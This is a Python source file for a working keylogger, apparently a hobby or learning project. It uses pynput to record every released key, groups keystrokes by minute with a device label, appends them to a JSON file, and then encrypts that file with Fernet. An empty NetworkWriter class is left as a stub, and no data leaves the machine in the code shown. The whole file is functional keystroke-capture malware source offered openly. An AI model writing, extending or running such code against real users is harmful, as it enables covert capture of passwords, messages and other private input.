import time, os
from pynput import keyboard
from cryptography.fernet import Fernet
import json
from requests import request

# ===================== Service (State) =====================

class KeyLoggerService:
    def __init__(self):
        self.global_log = []
        self.log_l = {}
        self.long_str = ""

    @staticmethod
    def get_time():
        """Get The time by Minutes"""
        formatted_time = time.strftime("%Y-%m-%d %H:%M", time.localtime())
        return formatted_time

    def make_long_str(self, key):
        """Build 'exit' detector tail from printable chars only."""
        if hasattr(key, 'char') and key.char:
            self.long_str += key.char

    def make_dict(self, key):
        """Accumulate raw key events under the current minute."""
        now = self.get_time()
        if now in self.log_l:
            self.log_l[now].append(key)
        else:
            self.log_l[now] = [key]


# ===================== Writer (File Sink) =====================

class FileWriter:
    def __init__(self, device_id: str):
        self.device_id = device_id

    def outing_to_file(self, character):
        with open("keyfile.json", "a", encoding="utf-8") as f:
            for i in character:  #
                for minute, items in i.items():
                    record = {
                        "device_id": self.device_id,
                        "time": minute,
                        "keys": [
                            (t.char if hasattr(t, "char") and t.char else str(t))
                            for t in items
                        ],
                    }
                    f.write(json.dumps(record, ensure_ascii=False) + "\n")

# ===================== Manager (Flow) =====================

class KeyLoggerManager:
    def __init__(self, service, writer):
        self.log_l = None
        self.Key = None
        self.global_log = None
        self.long_str = None
        self.service = service
        self.writer = writer
        self.current_hour = time.strftime("%Y-%m-%d %H", time.localtime())

    def key_for_log(self, key):
        """Handle each key event: update state, maybe flush, maybe stop."""
        self.service.make_long_str(key)
        self.service.make_dict(key)

        new_hour = time.strftime("%Y-%m-%d %H", time.localtime())
        if new_hour != self.current_hour:
            if self.service.log_l:
                self.service.global_log.append(self.service.log_l)
                self.writer.outing_to_file(self.service.global_log)
                self.service.log_l = {}
                self.service.global_log = []
            self.current_hour = new_hour

        if self.service.long_str[-4:] == "exit":
            print("Detected 'exit' key:", list(self.service.long_str))
            self.service.long_str = ""

        elif key == keyboard.Key.space:
            self.service.global_log.append(self.service.log_l)
            self.service.log_l = {}

        elif key == keyboard.Key.esc:
            self.service.global_log.append(self.service.log_l)

            for i in self.service.global_log:
                for j in i:
                    print(f"{j}\n{i[j]} ")

            self.writer.outing_to_file(self.service.global_log)

            self.service.log_l = {}
            return False
        return None

    def starting_listening(self):
        """Start listening"""
        self.service.log_l = {}
        self.service.long_str = ""
        with keyboard.Listener(on_release=self.key_for_log) as listener:
            listener.join()


# ===================== Encryptor (unchanged API) =====================

class Encryptor:
    def __init__(self, key_path):
        self.key_path = key_path
        self.key: bytes | None = None

    def make_key(self):
        """Load existing key or create a new one, store in self.key and return it."""
        if os.path.exists(self.key_path):
            self.key = open(self.key_path, "rb").read()
        else:
            self.key = Fernet.generate_key()
            with open(self.key_path, "wb") as f:
                f.write(self.key)
        print("Key:", self.key.decode())
        return self.key

    def encrypt_file(self, input_filename: str, output_filename: str, key: bytes) -> None:
        """Encrypt input -> write to output (never overwrite input in-place)."""
        f = Fernet(key)
        with open(input_filename, "rb") as fin:
            data = fin.read()
        enc = f.encrypt(data)
        with open(output_filename, "wb") as fout:
            fout.write(enc)

    def decrypt_file(self, input_filename: str, output_filename: str, key: bytes) -> None:
        """Decrypt input -> write to output."""
        f = Fernet(key)
        with open(input_filename, "rb") as fin:
            data = fin.read()
        dec = f.decrypt(data)
        with open(output_filename, "wb") as fout:
            fout.write(dec)


class NetworkWriter:
    pass


# ===================== Main =====================

if __name__ == "__main__":
    # Logging
    service = KeyLoggerService()
    writer = FileWriter(device_id="MacBook Air 15")
    manager = KeyLoggerManager(service, writer)
    manager.starting_listening()

    # Files
    original  = "keyfile.json"
    encrypted = "keyfile.encrypted"
    decrypted = "keyfile_decrypted.json"

    # Encrypt & Decrypt
    enc = Encryptor("key.key")
    key = enc.make_key()
    enc.encrypt_file(original, encrypted, key)
    enc.decrypt_file(encrypted, decrypted, key)
    print("Encryption & Decryption done.")
